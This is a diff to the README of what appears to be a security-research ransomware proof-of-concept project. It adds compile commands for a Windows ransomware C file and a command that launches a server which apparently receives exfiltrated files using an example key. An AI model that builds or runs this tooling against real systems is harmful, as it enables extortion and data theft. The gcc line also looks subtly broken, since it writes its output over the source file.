@@ -16,7 +16,7 @@ For more information about this repository visit [here](www.berylliumsec.com/blo
 - Clang
 - Openssl
 
-To compile, do 
+To compile, do: (change it to whatever matches your environment)
 
 ```bash
 clang-cl -I"C:\Program Files\OpenSSL-Win64\include" ransomware_windows_poc.c /link /LIBPATH:"C:\Program Files\OpenSSL-Win64\lib\VC\x64\MD" ws2_32.lib libssl.lib libcrypto.lib
@@ -33,4 +33,16 @@ To compile, do
 
 ```bash
 gcc -O2 -maes -msse4.1 -fno-pie -no-pie     ransomware_windows_poc.c -o ransomware_windows_poc.c    -lssl -lcrypto -ldl -lpthread
+```
+
+To start the server do
+
+```bash
+python server.py \
+    --tls-port 9999 \
+    --tcp-port 8080 \
+    --key "ThisIsA32ByteKeyForExample01234567" \
+    --cert cert.crt \
+    --cert-key cert.key \
+    --out-file uploaded_file.bin
 ```
